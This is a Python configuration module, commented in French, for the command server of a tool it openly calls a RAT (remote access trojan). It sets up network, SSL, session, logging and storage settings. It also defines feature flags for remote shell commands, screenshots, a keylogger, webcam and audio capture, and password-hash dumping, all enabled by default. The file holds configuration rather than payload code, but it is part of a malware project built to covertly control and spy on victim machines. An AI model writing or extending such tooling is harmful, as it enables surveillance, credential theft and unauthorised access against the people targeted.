"""
Server Configuration - Configuration du serveur RAT
Paramètres de réseau, sécurité et fonctionnalités serveur
"""

import os
import json
import logging
from typing import Dict, Any, Optional, Tuple
from pathlib import Path

from shared.constants import *

logger = logging.getLogger(__name__)

class ServerConfig:
    """Configuration du serveur RAT avec paramètres sécurisés"""
    
    def __init__(self, config_file: str = None):
        # === CONFIGURATION RÉSEAU ===
        self.HOST = DEFAULT_HOST
        self.PORT = DEFAULT_PORT
        self.MAX_CONNECTIONS = MAX_SESSIONS
        self.BUFFER_SIZE = DEFAULT_BUFFER_SIZE
        self.SOCKET_TIMEOUT = SOCKET_TIMEOUT
        self.HANDSHAKE_TIMEOUT = 10
        
        # === SÉCURITÉ SSL ===
        self.USE_SSL = False
        self.SSL_CERT_FILE = None
        self.SSL_KEY_FILE = None
        self.SSL_CA_FILE = None
        self.SSL_VERIFY_CLIENT = False
        
        # === GESTION DES SESSIONS ===
        self.SESSION_TIMEOUT = SESSION_TIMEOUT
        self.HEARTBEAT_INTERVAL = HEARTBEAT_INTERVAL
        self.AUTO_CLEANUP_INTERVAL = 300  # 5 minutes
        
        # === LOGGING ===
        self.DEBUG = False
        self.LOG_FILE = DEFAULT_LOG_FILE
        self.LOG_LEVEL = "INFO"
        self.LOG_MAX_SIZE = 10 * 1024 * 1024  # 10MB
        self.LOG_BACKUP_COUNT = 5
        
        # === SÉCURITÉ AVANCÉE ===
        self.WHITELIST_IPS = []
        self.BLACKLIST_IPS = []
        self.MAX_FAILED_ATTEMPTS = 3
        self.BAN_DURATION = 3600  # 1 heure
        
        # === STOCKAGE ===
        self.DATA_DIR = "server/data"
        self.DOWNLOADS_DIR = "server/data/downloads"
        self.UPLOADS_DIR = "server/data/uploads"
        self.LOGS_DIR = "server/data/logs"
        
        # === LIMITATIONS ===
        self.MAX_FILE_SIZE = MAX_FILE_SIZE
        self.MAX_MESSAGE_SIZE = MAX_MESSAGE_SIZE
        self.ENABLE_FILE_UPLOAD = True
        self.ENABLE_FILE_DOWNLOAD = True
        
        # === FONCTIONNALITÉS ===
        self.ENABLE_SHELL_COMMANDS = True
        self.ENABLE_SCREENSHOT = True
        self.ENABLE_KEYLOGGER = True
        self.ENABLE_WEBCAM = True
        self.ENABLE_AUDIO = True
        self.ENABLE_HASHDUMP = True
        
        # Chargement de la configuration personnalisée
        if config_file:
            self.load_from_file(config_file)
        
        # Création des répertoires nécessaires
        self._create_directories()
        
        # Validation de la configuration
        self._validate_config()
    
    def _create_directories(self):
        """Crée les répertoires nécessaires"""
        directories = [
            self.DATA_DIR,
            self.DOWNLOADS_DIR,
            self.UPLOADS_DIR,
            self.LOGS_DIR
        ]
        
        for directory in directories:
            try:
                os.makedirs(directory, exist_ok=True)
            except Exception as e:
                logger.warning(f"Impossible de créer le répertoire {directory}: {e}")
    
    def load_from_file(self, config_file: str) -> bool:
        """
        Charge la configuration depuis un fichier JSON
        
        Args:
            config_file: Chemin vers le fichier de configuration
        
        Returns:
            bool: True si succès, False sinon
        """
        try:
            if not os.path.exists(config_file):
                logger.warning(f"Fichier de configuration non trouvé: {config_file}")
                return False
            
            with open(config_file, 'r', encoding='utf-8') as f:
                config_data = json.load(f)
            
            # Mise à jour des attributs
            for key, value in config_data.items():
                if hasattr(self, key.upper()):
                    setattr(self, key.upper(), value)
                    logger.debug(f"Configuration chargée: {key.upper()} = {value}")
            
            logger.info(f"Configuration chargée depuis {config_file}")
            return True
            
        except json.JSONDecodeError as e:
            logger.error(f"Erreur JSON dans le fichier de config: {e}")
            return False
        except Exception as e:
            logger.error(f"Erreur chargement config: {e}")
            return False
    
    def save_to_file(self, config_file: str) -> bool:
        """
        Sauvegarde la configuration dans un fichier JSON
        
        Args:
            config_file: Chemin vers le fichier de configuration
        
        Returns:
            bool: True si succès, False sinon
        """
        try:
            # Récupération des attributs de configuration
            config_data = {}
            for attr_name in dir(self):
                if (attr_name.isupper() and 
                    not attr_name.startswith('_') and 
                    not callable(getattr(self, attr_name))):
                    config_data[attr_name.lower()] = getattr(self, attr_name)
            
            # Sauvegarde
            os.makedirs(os.path.dirname(config_file), exist_ok=True)
            with open(config_file, 'w', encoding='utf-8') as f:
                json.dump(config_data, f, indent=2, ensure_ascii=False)
            
            logger.info(f"Configuration sauvegardée dans {config_file}")
            return True
            
        except Exception as e:
            logger.error(f"Erreur sauvegarde config: {e}")
            return False
    
    def _validate_config(self):
        """Valide la configuration et corrige les valeurs incorrectes"""
        # Validation du port
        if not (1 <= self.PORT <= 65535):
            logger.warning(f"Port invalide {self.PORT}, utilisation du port par défaut {DEFAULT_PORT}")
            self.PORT = DEFAULT_PORT
        
        # Validation des timeouts
        if self.SOCKET_TIMEOUT <= 0:
            self.SOCKET_TIMEOUT = SOCKET_TIMEOUT
        
        if self.SESSION_TIMEOUT <= 0:
            self.SESSION_TIMEOUT = SESSION_TIMEOUT
        
        # Validation des tailles maximales
        if self.MAX_FILE_SIZE <= 0:
            self.MAX_FILE_SIZE = MAX_FILE_SIZE
        
        if self.MAX_MESSAGE_SIZE <= 0:
            self.MAX_MESSAGE_SIZE = MAX_MESSAGE_SIZE
        
        # Validation SSL
        if self.USE_SSL:
            if not self.SSL_CERT_FILE or not os.path.exists(self.SSL_CERT_FILE):
                logger.warning("Certificat SSL non trouvé, SSL désactivé")
                self.USE_SSL = False
            
            if not self.SSL_KEY_FILE or not os.path.exists(self.SSL_KEY_FILE):
                logger.warning("Clé SSL non trouvée, SSL désactivé")
                self.USE_SSL = False
    
    def validate_config(self) -> Tuple[bool, list]:
        """
        Valide la configuration complète
        
        Returns:
            tuple: (is_valid, list_of_errors)
        """
        errors = []
        
        # Validation réseau
        if not isinstance(self.HOST, str) or not self.HOST:
            errors.append("HOST invalide")
        
        if not isinstance(self.PORT, int) or not (1 <= self.PORT <= 65535):
            errors.append("PORT invalide")
        
        # Validation SSL
        if self.USE_SSL:
            if not self.SSL_CERT_FILE or not os.path.exists(self.SSL_CERT_FILE):
                errors.append("Certificat SSL manquant ou invalide")
            
            if not self.SSL_KEY_FILE or not os.path.exists(self.SSL_KEY_FILE):
                errors.append("Clé SSL manquante ou invalide")
        
        # Validation des répertoires
        for attr in ['DATA_DIR', 'DOWNLOADS_DIR', 'UPLOADS_DIR', 'LOGS_DIR']:
            directory = getattr(self, attr)
            if not os.path.exists(directory):
                try:
                    os.makedirs(directory, exist_ok=True)
                except Exception:
                    errors.append(f"Impossible de créer le répertoire {directory}")
        
        return len(errors) == 0, errors
    
    def get_ssl_config(self) -> Dict[str, Any]:
        """Retourne la configuration SSL"""
        if not self.USE_SSL:
            return {}
        
        return {
            'cert_file': self.SSL_CERT_FILE,
            'key_file': self.SSL_KEY_FILE,
            'ca_file': self.SSL_CA_FILE,
            'verify_client': self.SSL_VERIFY_CLIENT
        }
    
    def get_network_config(self) -> Dict[str, Any]:
        """Retourne la configuration réseau"""
        return {
            'host': self.HOST,
            'port': self.PORT,
            'max_connections': self.MAX_CONNECTIONS,
            'buffer_size': self.BUFFER_SIZE,
            'socket_timeout': self.SOCKET_TIMEOUT,
            'use_ssl': self.USE_SSL
        }
    
    def get_security_config(self) -> Dict[str, Any]:
        """Retourne la configuration de sécurité"""
        return {
            'session_timeout': self.SESSION_TIMEOUT,
            'max_failed_attempts': self.MAX_FAILED_ATTEMPTS,
            'ban_duration': self.BAN_DURATION,
            'whitelist_ips': self.WHITELIST_IPS,
            'blacklist_ips': self.BLACKLIST_IPS,
            'max_file_size': self.MAX_FILE_SIZE,
            'max_message_size': self.MAX_MESSAGE_SIZE
        }
    
    def update_from_dict(self, config_dict: Dict[str, Any]) -> bool:
        """
        Met à jour la configuration avec un dictionnaire
        
        Args:
            config_dict: Dictionnaire de configuration
        
        Returns:
            bool: True si mise à jour effectuée
        """
        try:
            updated = False
            
            for key, value in config_dict.items():
                key_upper = key.upper()
                if hasattr(self, key_upper):
                    old_value = getattr(self, key_upper)
                    if old_value != value:
                        setattr(self, key_upper, value)
                        updated = True
                        logger.info(f"Configuration mise à jour: {key_upper} = {value}")
            
            if updated:
                self._validate_config()
            
            return updated
            
        except Exception as e:
            logger.error(f"Erreur mise à jour config: {e}")
            return False
    
    def get_config_summary(self) -> str:
        """Retourne un résumé de la configuration"""
        is_valid, errors = self.validate_config()
        
        summary = f"""
=== CONFIGURATION SERVEUR RAT ===
Réseau: {self.HOST}:{self.PORT}
SSL: {'Activé' if self.USE_SSL else 'Désactivé'}
Connexions max: {self.MAX_CONNECTIONS}
Debug: {'Activé' if self.DEBUG else 'Désactivé'}

Répertoires:
- Data: {self.DATA_DIR}
- Downloads: {self.DOWNLOADS_DIR}
- Uploads: {self.UPLOADS_DIR}
- Logs: {self.LOGS_DIR}

Sécurité:
- Timeout sessions: {self.SESSION_TIMEOUT}s
- Tentatives max: {self.MAX_FAILED_ATTEMPTS}
- Taille fichier max: {self.MAX_FILE_SIZE // (1024*1024)}MB

Fonctionnalités:
- Shell: {'Activé' if self.ENABLE_SHELL_COMMANDS else 'Désactivé'}
- Screenshot: {'Activé' if self.ENABLE_SCREENSHOT else 'Désactivé'}
- Keylogger: {'Activé' if self.ENABLE_KEYLOGGER else 'Désactivé'}
- Webcam: {'Activé' if self.ENABLE_WEBCAM else 'Désactivé'}
- Audio: {'Activé' if self.ENABLE_AUDIO else 'Désactivé'}

Configuration {'VALIDE' if is_valid else 'INVALIDE'}
        """
        
        if errors:
            summary += f"\nERREURS: {', '.join(errors)}"
        
        return summary.strip()
    
    def create_default_config_file(self, file_path: str) -> bool:
        """Crée un fichier de configuration par défaut"""
        default_config = {
            "host": "0.0.0.0",
            "port": 8888,
            "use_ssl": False,
            "debug": False,
            "max_connections": 100,
            "session_timeout": 300,
            "log_level": "INFO",
            "enable_shell_commands": True,
            "enable_screenshot": True,
            "enable_keylogger": True,
            "enable_webcam": True,
            "enable_audio": True,
            "enable_hashdump": True
        }
        
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(default_config, f, indent=2, ensure_ascii=False)
            return True
        except:
            return False